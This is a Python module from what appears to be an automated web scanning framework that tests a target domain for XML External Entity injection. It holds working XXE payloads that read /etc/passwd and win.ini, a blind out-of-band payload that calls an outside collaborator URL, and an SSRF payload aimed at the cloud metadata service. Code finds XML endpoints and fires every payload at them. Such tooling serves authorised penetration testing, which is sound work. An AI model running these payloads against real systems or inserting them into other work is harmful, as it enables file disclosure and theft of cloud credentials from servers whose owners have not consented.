"""
modules/xxe.py
--------------
XML External Entity injection.
Detects XML endpoints, sends XXE payloads, checks for file disclosure
or OOB callback (via collaborator/interactsh).
"""

from typing import List, Dict, Optional
from urllib.parse import urlparse

from core.logger import get_logger, info, ok, warn
from core.utils import safe_request, write_lines
from modules._common import load_urls, module_dir, save_finding, cli_main
from burp.collaborator import get_oob_payload

log = get_logger("xxe")


XXE_PAYLOADS = [
    # Classic file read
    """<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>""",
    # Windows
    """<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root>&xxe;</root>""",
    # Parameter entity (blind)
    """<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY % xxe SYSTEM "{OOB}"> %xxe;]>
<root>test</root>""",
    # SSRF
    """<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>&xxe;</root>""",
]

XXE_INDICATORS = ["root:x:", "[extensions]", "for 16-bit app support",
                  "ami-id", "instance-id", "computeMetadata"]


def is_xml_endpoint(url: str) -> bool:
    r = safe_request(url, timeout=8)
    if not r:
        return False
    ct = (r.headers.get("Content-Type", "") or "").lower()
    if "xml" in ct:
        return True
    text = (r.text or "")[:500]
    if text.strip().startswith("<?xml"):
        return True
    return False


def test_xxe(url: str) -> List[Dict]:
    findings: List[Dict] = []
    oob = get_oob_payload()
    oob_url = oob.get("payload", "") if oob.get("ok") else ""

    for template in XXE_PAYLOADS:
        payload = template.replace("{OOB}", oob_url)
        r = safe_request(url, method="POST",
                         headers={"Content-Type": "application/xml"},
                         data=payload, timeout=12)
        if not r:
            continue
        text = r.text or ""
        for ind in XXE_INDICATORS:
            if ind in text:
                findings.append({
                    "type": "xxe",
                    "url": url,
                    "payload": payload[:200],
                    "evidence": f"File content marker '{ind}' found",
                    "severity": "critical",
                    "confidence": 90,
                })
                return findings
    return findings


def run(domain: str, output_root: str = "results",
        scan_id: Optional[int] = None) -> Dict:
    mdir = module_dir(domain, "xxe", output_root)
    urls = load_urls(domain, output_root)
    if not urls:
        return {"count": 0, "findings": []}

    # Heuristic: URLs with xml, rss, soap, sitemap in path
    xml_hints = ["xml", "soap", "wsdl", "rss", "feed", "sitemap", ".asmx"]
    candidates = [u for u in urls if any(h in u.lower() for h in xml_hints)]
    if not candidates:
        candidates = urls[:30]

    info(f"Testing {len(candidates)} XML-suspect URLs for XXE")
    findings: List[Dict] = []

    for url in candidates[:80]:
        try:
            if not is_xml_endpoint(url) and ".asmx" not in url and "xml" not in url:
                continue
            for f in test_xxe(url):
                findings.append(f)
                save_finding(domain, "xxe", "xxe", "critical", f["url"],
                             payload=f["payload"], evidence=f["evidence"],
                             confidence=f["confidence"],
                             scan_id=scan_id, output_root=output_root)
                warn(f"XXE: {f['url']}")
        except Exception as e:
            log.debug(f"xxe test failed: {e}")

    if findings:
        write_lines(mdir / "xxe_findings.txt",
                    [f"[CRITICAL] {f['url']}" for f in findings])

    return {"count": len(findings), "findings": findings}


if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser()
    p.add_argument("-t", "--target", required=True)
    p.add_argument("-o", "--output", default="results")
    args = p.parse_args()
    cli_main(args.target, "xxe", run, args.output)